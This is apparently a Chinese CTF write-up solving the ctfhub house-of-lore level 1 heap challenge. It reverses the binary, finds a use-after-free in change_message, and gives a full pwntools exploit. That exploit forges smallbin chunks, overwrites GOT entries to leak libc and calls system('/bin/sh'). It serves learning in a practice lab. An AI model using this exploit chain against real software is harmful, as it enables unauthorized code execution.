# ctfhub-lore-level1

https://iyheart.github.io/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/

接下尝试写一题，题目来源：ctfhub-house-of-lore

## level_1分析1

拿到附件后我们就先check一下附件，看看附件开启了什么保护机制。发现没有开PIE

```
# checksec ./data/sample26
[*] '/root/AutoExpMarkDocker/data/sample26'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

然后我们再逆向该程序，使用IDA pro，先来查看一下main函数的运行逻辑。main函数的大致逻辑如下：
先对输入输出进行初始化

然后再初始化一个name_message

之后就会进入一个menu的循环之中，这个时候程序会让用户read_int即输入一个选项，这里我们就来归纳一下对应选项的菜单，这里的menu函数就不进去查看了。

- 选项1：add操作
- 选项2：edit操作
- 选项3：dele操作
- 选项4：change name操作
- 选项5：change message操作，注意在程序只能调用一次change message，调用完之后再调用就不会调用change message函数了
- 选项6：exit
- 选项其他：Invalid choice

```c
  init();
  init_name_message();
  v3 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v4 = read_int();
      if ( v4 != 1 )
        break;
      add();
    }
    switch ( v4 )
    {
      case 2:
        edit();
        break;
      case 3:
        delete();
        break;
      case 4:
        change_name();
        break;
      case 5:
        if ( v3 )
        {
          puts("I think one chance is enough");
        }
        else
        {
          change_message();
          v3 = 1;
        }
        break;
      case 6:
        puts("Good job!");
        exit(0);
      default:
```

- 以上就是main函数的执行流程，然后我们现在先来查看一下init_message这个函数的功能
    - 首先会让用户输入name，name也是一个全局变量
    - 之后会申请一个堆块保存给全局变量message，申请堆块后会让用户向这个堆块中输入内容

    ```c
    int init_name_message()
    {
        puts("Now,please input your name,Mr. writer:");
        read(0, &name, 0x20u);
        puts("And write some message for your book?");
        message = malloc(0xB0u);
        read(0, message, 0xB0u);
        return puts("Ready!Let's begin!");
    }
    ```

- 接下来我们继续安装增删改查的顺序查看每个函数的功能
    - 先查看的是add函数，这里出现了一个名为page_list的全局变量，这个全局变量是一个指针数组，存储的是地址，数组里面有7个元素
    - 如果page_list满了就会输出Full并且结束该函数
    - 如果没满，就会提示用户输入size，这个size就是之后我们要申请的堆块的大小
    - 申请完之后，malloc返回的指针就赋值给对应page_list的地方
    - 之后又出现了一个名为size_list的全局变量，这个全局变量是一个int类型的数组，这个数组存储的是我们所申请的size的值
    ```c
    int add()
    {
        int v1; // [rsp+4h] [rbp-Ch]
        int i; // [rsp+8h] [rbp-8h]
        int v3; // [rsp+Ch] [rbp-4h]

        v1 = -1;
        for ( i = 0; i <= 6; ++i )
        {
            if ( !*(&page_list + i) )
            {
            v1 = i;
            break;
            }
        }
        if ( v1 == -1 )
            return puts("Full!");
        printf("Page %d's size:\n", v1);
        v3 = read_int();
        if ( v3 <= 127 || v3 > 239 )
        {
            puts("Error size!");
            exit(0);
        }
        *(&page_list + v1) = malloc(v3);
        size_list[v1] = v3;
        return puts("Add success!Now you can edit it!");
    }
    ```

- 之后来查看dele函数，该函数的程序运行逻辑如下：
    - 用户首先要选择需要释放的堆块，之后程序会检查这个索引是否合理
    - 之后释放这个堆块，然后同时将相应的page_list和size_list置零。

    ```c
    int delete()
    {
        int v1; // [rsp+Ch] [rbp-4h]

        puts("Which page do you want to delete?");
        v1 = read_int();
        if ( (unsigned int)v1 >= 8 || !*(&page_list + v1) )
        {
            puts("Error index!");
            exit(0);
        }
        free(*(&page_list + v1));
        *(&page_list + v1) = 0;
        size_list[v1] = 0;
        return puts("Delete success!");
    }
    ```

- 然后查看edit函数，函数逻辑如下：
    - 首先要求用户输入要edit堆块的index
    - 然后就使用read向堆块中输入内容，指定输入长度为size_list
    ```c
    int edit()
        {
        int v1; // [rsp+Ch] [rbp-4h]

        puts("Which page do you want to edit?");
        v1 = read_int();
        if ( (unsigned int)v1 >= 8 || !*(&page_list + v1) || !size_list[v1] )
        {
            puts("Error index!");
            exit(0);
        }
        puts("Input your content:");
        read(0, *(&page_list + v1), size_list[v1]);
        return puts("Edit success!");
    }
    ```

- 然后查看change_name()函数，函数的主要逻辑如下，就是重新向name写入东西
    ```c
    int change_name()
    {
        puts("Your new name:");
        read(0, &name, 0x20u);
        return puts("Done!");
    }
    ```

- 再查看change_message()这个函数，函数的具体逻辑如下：
    - 首先泄露出这个message的堆地址，然后会释放message所指向的堆块
    - 然后再让用户输入之后要申请的堆块大小
    - 申请堆块，malloc的返回值将赋值给buf
    - 之后就是向buf写入内容，长度不能超过我们所申请的。
    - 之后还会修改message所指向的堆块注意这里就存在着UAF漏洞
    - 修改message所指向堆块后就会更新message
    ```c
    void *change_message()
    {
        void *result; // rax
        int v1; // [rsp+4h] [rbp-Ch]
        void *buf; // [rsp+8h] [rbp-8h]

        puts("So I think the old message is useless,right?");
        printf("Your message is saved at %p\n", message);
        free(message);
        puts("Your size of new message:");
        v1 = read_int();
        if ( v1 <= 127 || v1 > 239 )
        {
            puts("Error size!");
            exit(0);
        }
        buf = malloc(v1);
        puts("Input your new message:");
        read(0, buf, v1);
        puts("Done!");
        puts("Oh,I'm sorry,maybe you should say goodbye to the old message:");
        read(0, message, 0x10u);
        puts("New!");
        result = buf;
        message = buf;
        return result;
    }
    ```

- 逆向该程序的逻辑后，我们找到了漏洞利用的主要地方，这个地方就是在change_message()这个函数中，我们可以利用这个函数进行UAF漏洞
- 我们现在也对全局变量进行一个归纳和汇总：
    - name：存储着用户输入的数据，相当于字符数组，长度为0x40大小。
    - message：是一个指针，指向malloc返回的堆块地址
    - page_list：是一个指针数组，指向malloc返回的堆块地址，一共有7个元素
    - size_list：是一个int类型的数组，存储着page_list对应索引申请的堆块大小

## level_1分析2

接下来我们边写脚本，边进行动态调试。根据程序运行逻辑我们编写了如下代码进行交互。

```python
from pwn import *
context.log_level='debug'
context.terminal = ["tmux", "neww"]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process("./pwn")
#gdb.attach(p)
#gdb.attach(p)
def add(size):
        p.sendline(b'1')
        p.sendafter(b'size:\n',str(size).encode('utf-8'))

def dele(idx):
        p.sendline(b'3')
        p.send(str(idx).encode('utf-8'))

def edit(idx,context):
        p.sendline(b'2')
        p.sendline(str(idx).encode('utf-8'))
        p.send(context)

def change_name(name):
        p.sendline(b'4')
        p.send(name)

def change_mesg(size,new_mesg,mesg):
        p.sendline(b'5')
        p.recvuntil(b'saved at ')
        a = p.recvline()[:-1]
        print('leak--->',a)
        p.send(str(size).encode('utf-8'))
        p.send(new_mesg)
        p.send(mesg)
        return a
payload1 = b'a'
p.sendlineafter(b'writer:\n',payload1)
payload2 = b'a'
p.sendlineafter(b'book?\n',payload2)
add(200)
edit(0,b'11111')
dele(0)
heap_addr = change_mesg(200,b'11',b'22')
heap_addr = int(heap_addr,16)
print('---->',hex(heap_addr))
p.interactive()
```

- 根据分析1，我们可以修改释放后的message指向的堆块，接下来我们来查看释放后的堆块会被放在什么bins中。我们会发现这个堆块会被放入smallbins中，这时我们可以read(0, message, 0x10uLL)从而修改这个堆块的fd、bk指针

image-20250303175040088

- 所以这题的考点就是house-of-lore，现在我们就要对堆块进行伪造，从而可以使用malloc申请到任意地址。这里由于我们bss段地址是固定的，并且我们的name变量是可以写的，所以我们就使用name这个数据块伪造堆块，使其绕过检查
- 这时我们通过house-of-lore的利用，就可以将这个name的地址申请过来，并且由于之前的实验中的堆块并没有伪造size位，只需要伪造fd、bk即可，所以我们接下来就对其进行伪造。
- 首先我们已经将堆块的地址泄露出来了，泄露出来的同时我们要修改处于smallbins中堆块的bk指针。我们先来修改一下
- 这时我们修改的堆块就会出现一个问题，就是我们只要修改bk指针，我们会顺手把fd指针也被修改了。在写这题的时候我有注意到这一点，但是后面发现，在house of lore中修改smallbins中的fd指针貌似不会对这种堆利用方式有什么影响

image-20250303181232835

- 查看glibc源码时发现，在malloc中只进行了bck->fd != victim检查，在free中才对fwd->bk != bck进行检查，而house-of-lore利用中我们后续并没有再释放堆块，所以并不会调用free，所以并不需要关系fd指针。

- 现在我们就开始进行house-of-lore的堆块伪造，由于之前我们确定name这个.bss段，但是我们只能对.bss这个段写入0x20的数据，所以我们要在利用name-0x10这个字段，伪造fake_chunk1的prevsize和size字段。

image-20250305175004220

- 这时我们就通过change_message修改放在smallbin中的chunk。

image-20250305175353698

image-20250305180018667

    ```python
    payload1 = b'a'
    p.sendlineafter(b'writer:\n',payload1)
    payload2 = b'a'
    p.sendlineafter(b'book?\n',payload2)
    add(0xC8)

    payload = p64(0)+p64(0x6020A0-0x10)
    heap_addr = change_mesg(200,b'11',payload)
    heap_addr = int(heap_addr,16)
    print('---->',hex(heap_addr))
    ```

- 现在我们在修改bk指针的同时就已经把堆地址给泄露出来了。现在我们就可以使用change_name伪造堆块，由于输入字节数的原因，我们就可以进行如下操作，将fake_chunk2与fake_chunk1的bk指针共用一个内存空间。

    ```python
    payload = p64(heap_addr-0x10)+p64(0x6020A0+0x8)
    payload +=p64(0)+p64(0x6020A0-0x10)
    change_name(payload)
    ```

image-20250305180050884

image-20250305180704821

- 这时我们再进行两次申请,就可以将name申请回来，并且可以使用edit编辑，编辑到page_list这个数组

    ```python
    add(0xb0)
    add(0xb0)
    ```

- 这时我们就还差libc地址没有泄露，在做这题的时候一直卡在泄露这块，看了wp才发现，可以这么泄露：
    - 我们可以修改我们申请回来的name这个空间溢出到page_list[0],将这个地址修改为free_got的地址
    - 然后再修改page_list[1]，将其地址修改为puts_got表
    - 再一次通过edit修改这时我们修改的时free_got表存储的值，将其改为puts_plt表，这时我们调用
    - 最后我们再free(page_list[1])，这时传递的是puts_got表的地址，该地址存储着puts的地址
    - 我们free(page_list[1])实际上是puts(puts_got)，这时我们就泄露了libc的地址

    ```python
    free_got = 0x602018
    puts_got = 0x602020
    atoi_got = 0x602060
    payload = b'a'*0x40+p64(heap_addr+0xb0+0xc0+0xd0)
    payload+=b'a'*0x18+p64(free_got)+p64(puts_got)
    payload+=p64(atoi_got)

    edit(2,payload)
    edit(0,p64(0x4006A0))
    #gdb.attach(p)
    #pause()
    dele(1)
    p.recvuntil(b'delete?\n')
    puts_addr = p.recvline()[:-1]
    print('puts_addr--->',puts_addr)
    ```

- 最后我们再劫持atoi_got，将其劫持为system的地址，之后我们在read_int的时候直接输入/bin/sh\x00，这样就可以直接getshell

    ```python
    dele(1)
    p.recvuntil(b'delete?\n')
    puts_addr = p.recvline()[:-1]
    print('puts_addr--->',puts_addr)
    puts_addr = int.from_bytes(puts_addr,'little')
    libc_addr = puts_addr - libc.symbols['puts']
    system_addr = libc_addr + libc.symbols['system']

    edit(2,p64(system_addr))
    p.send(b'/bin/sh\x00')
    p.interactive()
    ```

## level_1_exp

exp如下：

```python
from pwn import *
context.log_level='debug'
context.terminal = ["tmux", "neww"]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process("./pwn")

def add(size):
        p.sendline(b'1')
        p.sendafter(b'size:\n',str(size).encode('utf-8'))

def dele(idx):
        p.sendline(b'3')
        p.send(str(idx).encode('utf-8'))

def edit(idx,context):
        p.sendline(b'2')
        p.sendline(str(idx).encode('utf-8'))
        p.send(context)

def change_name(name):
        p.sendline(b'4')
        p.send(name)

def change_mesg(size,new_mesg,mesg):
        p.sendline(b'5')
        p.recvuntil(b'saved at ')
        a = p.recvline()[:-1]
        print('leak--->',a)
        heap_addr = int(a,16)
        payload = p64(heap_addr+0xb0+0xd0)
        mesg = payload + mesg
        print('---->',hex(heap_addr))
        p.send(str(size).encode('utf-8'))
        p.send(new_mesg)
        p.send(mesg)
        return a

payload1 = b'a'
p.sendlineafter(b'writer:\n',payload1)
payload2 = b'a'
p.sendlineafter(b'book?\n',payload2)
add(0xC8)

payload = p64(0x6020A0-0x10)
heap_addr = change_mesg(200,b'11',payload)
heap_addr = int(heap_addr,16)
print('---->',hex(heap_addr))

payload = p64(heap_addr-0x10)+p64(0x6020A0+0x8)
payload +=p64(0)+p64(0x6020A0-0x10)
change_name(payload)
add(0xb0)
add(0xb0)

free_got = 0x602018
puts_got = 0x602020
atoi_got = 0x602060
payload = b'a'*0x40+p64(heap_addr+0xb0+0xc0+0xd0)
payload+=b'a'*0x18+p64(free_got)+p64(puts_got)
payload+=p64(atoi_got)

edit(2,payload)
edit(0,p64(0x4006A0))
dele(1)
p.recvuntil(b'delete?\n')
puts_addr = p.recvline()[:-1]
print('puts_addr--->',puts_addr)
puts_addr = int.from_bytes(puts_addr,'little')
libc_addr = puts_addr - libc.symbols['puts']
system_addr = libc_addr + libc.symbols['system']

edit(2,p64(system_addr))
p.send(b'/bin/sh\x00')
p.interactive()
```